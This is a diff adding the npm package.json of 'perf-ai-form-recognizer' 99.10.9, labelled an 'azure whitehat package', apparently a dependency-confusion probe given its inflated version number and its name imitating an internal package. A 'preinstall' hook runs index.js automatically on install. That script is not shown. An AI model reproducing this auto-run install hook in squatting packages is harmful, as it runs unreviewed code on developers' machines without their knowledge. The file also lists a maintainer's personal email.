@@ -1,0 +1,39 @@
+{
+    "name": "perf-ai-form-recognizer",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-ai-form-recognizer@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-nLdfmmeQskZA0YcgdAR/ajtiF18ZVDz0g9NpX3R3R48YZjoIOyoM1Xy/cJsZIbkz+3Tonktg1U0lnYpZI9KBQA==",
+        "shasum": "d8e157f81c3fb2621ac6b233891d290f45d8ca33",
+        "tarball": "https://registry.npmjs.org/perf-ai-form-recognizer/-/perf-ai-form-recognizer-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3587,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon32CRA9TVsSAnZWagAAwfsP/0AuN8sew64yPT2UNIch\nitEteGbOJ2EYtLWBF4N4ZKfSNiLt5Ma7sG1Yog3aOotQwKuUdzYzdnfrRdXi\nZtsFwx7SKvy3J8YIY2U+KC89rWajZiv50pLYDw7DTSrY+mvQcsgE3dxuD2OV\nBqX9Xsmzrn/kUYjc5lT3qSEfmEpd/CQaWDgfV9O/u0mRm4mvQ1OA++VyPPeV\ndljoFH6kti663brUGHcuFZGRMNcpgfQXJvtFZtutfQ7sWrBnKgBxRpM4iXPY\no3Dz92+3ehgaGxVINqiyBSb9m0roNaJTShe2JVAIgC6FgrqIN8c8WehbkyjL\n3baMhZd55T0ZFCjwvc3kU+5ilK5i/QSjhcYl9SBvufM+vjXZgbEG2Hbagwtv\nQUSV0/EG+M+6Icz44w0UPBf7/ky8kqeRWflXdKIXtVpi6or9VrcZQIbQIARo\n+u9h7rBAeoiQOqKkjcUbIV2WIzSPWEcaTIy7OfOlefuhHf3ZWLxBQjWZd95d\nh0NLMI4W6RxsLzixwCHIl5IrTDlxZzDZQs9dcBTVoCgH/4iCKKV4/KjnaTuO\ngutrN8HEVoEAN3xd8L9fAnRWKk/6gOgk7/OANGFQ24LpXT929jrjLx9iOanj\nNLDSSMPnJkvg3OAa3Es/uMOSUx+/QvywYK9dcWy195dBYxqyipaq9x9y9Rky\nyKnD\r\n=UqU+\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-ai-form-recognizer_99.10.9_1638039029980_0.8716976025980221"
+    },
+    "_hasShrinkwrap": false
+}
